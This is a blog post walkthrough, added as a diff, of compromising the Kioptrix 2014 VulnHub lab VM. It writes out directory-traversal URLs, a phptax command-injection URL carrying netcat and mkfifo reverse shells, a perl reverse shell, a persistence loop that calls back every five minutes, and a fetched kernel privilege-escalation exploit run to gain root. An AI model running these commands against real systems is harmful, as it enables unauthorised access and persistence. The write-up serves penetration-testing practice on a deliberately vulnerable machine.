@@ -1,0 +1,387 @@
+---
+layout: post
+title:  "Kioptrix: 2014"
+date:   2019-04-29 16:53:36 +0000
+author: Larry Brown
+category: Walkthroughs
+tags: [kioptrix, pchart, freebsd, apache, phptax, fetch]
+---
+    <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a></div>
+    <div>Hostname: kioptrix2014</div>
+    <div>IP Address: 10.183.0.205</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Information Gathering/Recon</h2></div>
+    <div><br /></div>
+    <div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.205.</div>
+    <div><br /></div>
+    <div class="note"><b>NOTE:</b> I had to remove and re-add the network adapter on the VM to get DHCP to work properly.</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Service Enumeration/Scanning</h2></div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2014# nmap -Pn -sT -sV -A -oA kioptrix2014 -p 1-65535 10.183.0.205</div>
+        <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-17 14:01 EDT</div>
+        <div>Nmap scan report for kioptrix2014.homenet.dom (10.183.0.205)</div>
+        <div>Host is up (0.0036s latency).</div>
+        <div>Not shown: 65532 filtered ports</div>
+        <div>PORT     STATE  SERVICE VERSION</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   closed ssh</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</font>
+        </div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</font>
+        </div>
+        <div>MAC Address: 00:0C:29:8D:66:A6 (VMware)</div>
+        <div>Device type: general purpose|specialized|storage-misc</div>
+        <div>Running (JUST GUESSING): FreeBSD 9.X|10.X|7.X|8.X|6.X (93%), AVtech embedded (91%), Linux 2.6.X (90%)</div>
+        <div>OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:linux:linux_kernel:2.6 cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:6.2 cpe:/a:nas4free:nas4free cpe:/o:freebsd:freebsd:10.2</div>
+        <div>Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (93%), AVtech Room Alert 26W environmental monitor (91%), Linux 2.6.18 - 2.6.22 (90%), FreeBSD 7.0-RELEASE - 9.0-RELEASE (88%), FreeBSD 7.0-RELEASE (87%), FreeBSD 7.1-PRERELEASE 7.2-STABLE (87%), FreeBSD 9.3-RELEASE (86%), FreeBSD 8.1-RELEASE (86%), FreeBSD 8.0-RELEASE (85%), FreeBSD 9.1-RELEASE or 10.1-RELEASE (85%)</div>
+        <div>No exact OS matches for host (test conditions non-ideal).</div>
+        <div>Network Distance: 1 hop</div>
+        <div>
+            <div><br /></div>
+            <div><br /></div>
+        </div>
+        <div>TRACEROUTE</div>
+        <div>HOP RTT     ADDRESS</div>
+        <div>1   3.65 ms kioptrix2014.homenet.dom (10.183.0.205)</div>
+        <div>
+            <div><br /></div>
+            <div><br /></div>
+        </div>
+        <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 140.30 seconds</div>
+    </div>
+    <div><br /></div>
+    <!--more-->
+    <div><br /></div>
+    <div><h2>Gaining Access</h2></div>
+    <div><br /></div>
+    <div>Let’s start by checking out each of the HTTP services on TCP port 80 and TCP port 8080.</div>
+    <div><br /></div>
+    <div>Connections to the default site for the HTTP service on TCP port 8080 just return a 403 Forbidden error.</div>
+    <div><br /></div>
+    <div>Connections to the default site for the HTTP service on TCP port 80 return a page saying “It works!”. Viewing the source code for the returned page, we see a comment in the header.</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-04-29-kioptrix-2014/0388A300-502C-40B9-9703-9AA23BD94211.png" height="188" width="1066" /><br /></div>
+    <div><br /></div>
+    <div>When browsing to the URL specified, we are redirected to: <a href="http://10.183.0.205/pChart2.1.3/examples/index.php">http://10.183.0.205/pChart2.1.3/examples/index.php</a>.</div>
+    <div><br /></div>
+    <div>Searching the exploit database, it appears we have a known vulnerability (Directory Traversal and Reflected XSS) with this specific version of pChart.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>pChart 2.1.3 - Multiple Vulnerabilities                                                                      | exploits/php/webapps/31173.txt</div>
+    </div>
+    <div><br /></div>
+    <div>Testing the Directory Traversal proof-of-concept (PoC) code in the exploit, we can confirm the site is vulnerable.</div>
+    <div><br /></div>
+    <div><a href="http://10.183.0.205/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd">http://10.183.0.205/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a> returns</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-04-29-kioptrix-2014/CA8E2405-AA68-43AE-9B47-A5FDF8A558E8.png" height="852" width="1304" /><br /></div>
+    <div><br /></div>
+    <div>Let’s see what else we can find out about the web service.</div>
+    <div><br /></div>
+    <div>We run nikto...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2014# nikto -h http://10.183.0.205</div>
+        <div>- Nikto v2.1.6</div>
+        <div>---------------------------------------------------------------------------</div>
+        <div>+ Target IP:          10.183.0.205</div>
+        <div>+ Target Hostname:    10.183.0.205</div>
+        <div>+ Target Port:        80</div>
+        <div>+ Start Time:         2019-04-17 14:18:50 (GMT-4)</div>
+        <div>---------------------------------------------------------------------------</div>
+        <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.21</font> (FreeBSD) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.2.21</font>
+            <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSL/0.9.8q</font>
+            <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">DAV/2</font>
+            <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.8</font>
+        </div>
+        <div>+ Server may leak inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014</div>
+        <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
+        <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
+        <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
+        <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSL/0.9.8q appears to be outdated</font> (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</div>
+        <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.2.21 appears to be outdated</font> (current is at least 2.8.31) (may depend on server version)</div>
+        <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.21 appears to be outdated</font> (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
+        <div>+ <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.3.8 appears to be outdated</font> (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.</div>
+        <div>+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</div>
+        <div>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</div>
+        <div>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</div>
+        <div>+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host</div>
+        <div>+ End Time:           2019-04-17 14:20:36 (GMT-4) (106 seconds)</div>
+        <div>---------------------------------------------------------------------------</div>
+        <div>+ 1 host(s) tested</div>
+    </div>
+    <div><br /></div>
+    <div>There are lots of old vulnerable pieces of software on the server, but none that seem to give remote access.</div>
+    <div><br /></div>
+    <div>Let’s see if we can use our directory traversal vulnerability to find the Apache configuration file. Google should be able to help with this. I’ll search “freebsd apache install path” and the first result takes me here: <a target="_blank" href="https://www.freebsd.org/doc/handbook/network-apache.html">https://www.freebsd.org/doc/handbook/network-apache.html</a></div>
+    <div><br /></div>
+    <div>The page tells me:</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-04-29-kioptrix-2014/83D82D8B-2B7F-413A-B3E1-9F04520A37E5.png" height="86" width="2202" /><br /></div>
+    <div><br /></div>
+    <div>So, let’s try /usr/local/etc/apache22/httpd.conf...</div>
+    <div><br /></div>
+    <div><a href="http://10.183.0.205/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf">http://10.183.0.205/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf</a></div>
+    <div><br /></div>
+    <div>That works! Let’s see how things are configured and where other interesting files might be.</div>
+    <div><br /></div>
+    <div>At the bottom of the file, we find an interesting Allow directive for the HTTP service on TCP port 8080.</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-04-29-kioptrix-2014/6EBD9A2E-B4BC-4281-A52B-2A661F52AB04.png" height="354" width="786" /><br /></div>
+    <div><br /></div>
+    <div>It looks like all we have to do to access the service is change our browser’s User-Agent to start with 'Mozilla/4.0’. That’s easy enough to do in Chrome...</div>
+    <div><br /></div>
+    <div>Developer Tools -&gt; ... (vertically in menu on right) -&gt; More tools -&gt; Network conditions</div>
+    <div><br /></div>
+    <div><img src="/assets/images/2019-04-29-kioptrix-2014/521CE178-FBFE-461F-85C0-8859A404AA36.png" height="380" width="834" /><br /></div>
+    <div><br /></div>
+    <div>Now when we load <a href="http://10.183.0.205:8080/">http://10.183.0.205:8080/</a> we are granted access. 😄</div>
+    <div><br /></div>
+    <div>We have a single link on the page for /phptax. Clicking that, we are taken to a page that renders a tax form. Let’s search the exploit database for ‘phptax’.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2014# searchsploit phptax</div>
+        <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+        <div> Exploit Title                                                                                                |  Path</div>
+        <div>                                                                                                             | (/usr/share/exploitdb/)</div>
+        <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+        <div>PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                                               | exploits/php/webapps/21833.rb</div>
+        <div>PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution                                            | exploits/php/webapps/25849.txt</div>
+        <div>phptax 0.8 - Remote Code Execution                                                                           | exploits/php/webapps/21665.txt</div>
+        <div>------------------------------------------------------------------------------------------------------------- ------------------------------------</div>
+        <div>Shellcodes: No Result</div>
+    </div>
+    <div><br /></div>
+    <div>Taking a look at 21665.txt, it looks like we can start a reverse shell by making a specially crafted request to /phptax/drawimage.php.</div>
+    <div><br /></div>
+    <div>I go ahead and set up my listeners in Metasploit. I prefer to start two listeners and start a second shell right after the first one comes up.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>msf5 &gt; use exploit/multi/handler</div>
+        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+        <div>payload =&gt; generic/shell_reverse_tcp</div>
+        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+        <div>LHOST =&gt; 10.183.0.222</div>
+        <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+        <div>LPORT =&gt; 5432</div>
+        <div>msf5 exploit(multi/handler) &gt; run -j</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[*] Exploit running as background job 0.</div>
+        <div>[*] Exploit completed, but no session was created.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
+        <div>msf5 exploit(multi/handler) &gt; </div>
+        <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+        <div>payload =&gt; generic/shell_reverse_tcp</div>
+        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+        <div>LHOST =&gt; 10.183.0.222</div>
+        <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+        <div>LPORT =&gt; 5433</div>
+        <div>msf5 exploit(multi/handler) &gt; run -j</div>
+        <div>[*] Exploit running as background job 1.</div>
+        <div>[*] Exploit completed, but no session was created.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>[*] Started reverse TCP handler on 10.183.0.222:5433 </div>
+    </div>
+    <div><br /></div>
+    <div>Now it’s time to try our exploit... passing the following reverse shell code (URL encoded).</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>nc -e /bin/sh 10.183.0.222 5432</div>
+    </div>
+    <div><br /></div>
+    <div><a href="http://10.183.0.205:8080/phptax/drawimage.php?pfilez=1040pg1.tob;nc%20-e%20%2Fbin%2Fsh%2010.183.0.222%205432;&amp;pdf=make">http://10.183.0.205:8080/phptax/drawimage.php?pfilez=1040pg1.tob;nc%20-e%20%2Fbin%2Fsh%2010.183.0.222%205432;&amp;pdf=make</a></div>
+    <div><br /></div>
+    <div>But nothing happens... Many times netcat is configured to not allow the -e option. Let’s try doing a reverse shell just using netcat + pipes.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5432 &gt;/tmp/f</div>
+    </div>
+    <div><br /></div>
+    <div><a href="http://10.183.0.205:8080/phptax/drawimage.php?pfilez=1040pg1.tob;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff;&amp;pdf=make">http://10.183.0.205:8080/phptax/drawimage.php?pfilez=1040pg1.tob;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff;&amp;pdf=make</a></div>
+    <div><br /></div>
+    <div>Works! 😄 We connect to the session and start our second shell before the other one times out.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.205:24804) at 2019-04-17 18:21:34 -0400</div>
+        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+        <div>[*] Starting interaction with 1...</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>pwd</div>
+        <div>/usr/local/www/apache22/data2/phptax</div>
+        <div>$ id</div>
+        <div>uid=80(www) gid=80(www) groups=80(www)</div>
+        <div>$ perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+        <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.205:25766) at 2019-04-17 18:21:58 -0400</div>
+    </div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Maintaining Access</h2></div>
+    <div><br /></div>
+    <div>Since SSH is open on the victim, I checked to see if the www user has a default home directory and shell defined.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>$ grep `whoami` /etc/passwd</div>
+        <div>www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin</div>
+    </div>
+    <div><br /></div>
+    <div>The home directory doesn’t exists, and the default shell is set to '/usr/sbin/nologin’, so I won’t be able to SSH to the box with this account.</div>
+    <div><br /></div>
+    <div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes. I placed the script in the /usr/local/www/apache22/data2/phptax/pictures directory and called it ’thumbs’.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>$ cd pictures</div>
+        <div>$ cat &lt;&lt;EOF &gt; thumbs</div>
+        <div>#!/bin/sh</div>
+        <div>while true; do</div>
+        <div>    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5432 &gt;/tmp/f</div>
+        <div>    # sleep for 300 seconds (5 mins)</div>
+        <div>    sleep 300</div>
+        <div>done</div>
+        <div>EOF</div>
+        <div>$ chmod +x thumbs</div>
+        <div>$ ./thumbs &amp;</div>
+    </div>
+    <div><br /></div>
+    <div>With the script now running in the background, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Privilege Escalation</h2></div>
+    <div><br /></div>
+    <div>Looks like the victim is running FreeBSD 9.0.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>$ uname -a</div>
+        <div>FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</div>
+    </div>
+    <div><br /></div>
+    <div>Searching the exploit database, it appears we have some good candidates for privilege escalation.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit)                                     | exploits/freebsd/local/26454.rb</div>
+        <div>FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation                                                       | exploits/freebsd/local/28718.c</div>
+        <div>FreeBSD 9.0 &lt; 9.1 - 'mmap/ptrace' Local Privilege Escalation                                                 | exploits/freebsd/local/26368.c</div>
+    </div>
+    <div><br /></div>
+    <div>I make a copy of the 28718.c exploit code in my working directory. To get our exploit to the victim we are going to use python’s SimpleHTTPServer.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>root@kali:~/Walkthroughs/kioptrix2014# python -m SimpleHTTPServer 4321</div>
+        <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+    </div>
+    <div><br /></div>
+    <div>Since our FreeBSD system doesn’t have curl or wget, we have to use fetch to retrieve our exploit from our attacking system. Once we have that, we just have to compile and run it.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>$ cd /tmp</div>
+        <div>$ fetch -o 28718.c http://10.183.0.222:4321/28718.c</div>
+        <div>$ gcc -o pwn 28718.c</div>
+        <div>28718.c:178:2: warning: no newline at end of file</div>
+        <div>$ ./pwn</div>
+        <div>[+] SYSRET F___UP!!</div>
+        <div>[+] Start Engine...</div>
+        <div>[+] Crotz...</div>
+        <div>[+] Crotz...</div>
+        <div>[+] Crotz...</div>
+        <div>[+] Woohoo!!!</div>
+        <div>$ id</div>
+        <div>uid=0(root) gid=0(wheel) groups=0(wheel)</div>
+    </div>
+    <div> </div>
+    <div>POP!</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Pivoting</h2></div>
+    <div>N/A</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Clean Up</h2></div>
+    <div><br /></div>
+    <div>*** STOP /usr/local/www/apache22/data2/phptax/pictures/thumbs ***</div>
+    <div>*** REMOVE /usr/local/www/apache22/data2/phptax/pictures ***</div>
+    <div>*** REMOVE 28718.c and pwn from /tmp ***</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><h2>Additional Info</h2></div>
+    <div><br /></div>
+    <div><span style="font-weight: bold;">congrats.txt</span></div>
+    <div><br /></div>
+    <div>There is a congrats.txt file in the /root directory to pat us on the back.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>$ cd /root</div>
+        <div>$ cat congrats.txt</div>
+        <div>If you are reading this, it means you got root (or cheated).</div>
+        <div>Congratulations either way...</div>
+        <div>  </div>
+        <div>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in</div>
+        <div>mind, and not meant for the seasoned pentester. However this does not mean one</div>
+        <div>can't enjoy them.</div>
+        <div>  </div>
+        <div>As with all my VMs, besides getting "root" on the system, the goal is to also</div>
+        <div>learn the basics skills needed to compromise a system. Most importantly, in my mind,</div>
+        <div>are information gathering &amp; research. Anyone can throw massive amounts of exploits</div>
+        <div>and "hope" it works, but think about the traffic.. the logs... Best to take it</div>
+        <div>slow, and read up on the information you gathered and hopefully craft better</div>
+        <div>more targetted attacks.</div>
+        <div>  </div>
+        <div>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.</div>
+        <div>Knowing the OS gives you any idea of what will work and what won't from the get go.</div>
+        <div>Default file locations are not the same on FreeBSD versus a Linux based distribution.</div>
+        <div>Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".</div>
+        <div>It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".</div>
+        <div>Finding and knowing these little details will greatly help during an attack. Of course</div>
+        <div>my examples are specific for this target, but the theory applies to all systems.</div>
+        <div>  </div>
+        <div>As a small exercise, look at the logs and see how much noise you generated. Of course</div>
+        <div>the log results may not be accurate if you created a snapshot and reverted, but at least</div>
+        <div>it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.</div>
+        <div>Default settings, nothing fancy but it should've logged a few of your attacks. Look</div>
+        <div>at the following files:</div>
+        <div>/root/folderMonitor.log</div>
+        <div>/root/httpd-access.log (softlink)</div>
+        <div>/root/ossec-alerts.log (softlink)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified</div>
+        <div>files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS</div>
+        <div>for this.</div>
+        <div>The httpd-access.log is rather self-explanatory .</div>
+        <div>Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain</div>
+        <div>files. This one should've detected a few of your web attacks.</div>
+        <div>  </div>
+        <div>Feel free to explore the system and other log files to see how noisy, or silent, you were.</div>
+        <div>And again, thank you for taking the time to download and play.</div>
+        <div>Sincerely hope you enjoyed yourself.</div>
+        <div>  </div>
+        <div>Be good...</div>
+        <div>  </div>
+        <div>  </div>
+        <div>loneferret</div>
+        <div>http://www.kioptrix.com</div>
+        <div>  </div>
+        <div>  </div>
+        <div>p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by</div>
+        <div>default it would've blocked your IP (both in hosts.allow &amp; Firewall) for</div>
+        <div>600 seconds. I was nice enough to remove that part :)</div>
+    </div>
+    <div><br /></div>
+    <div><br /></div>
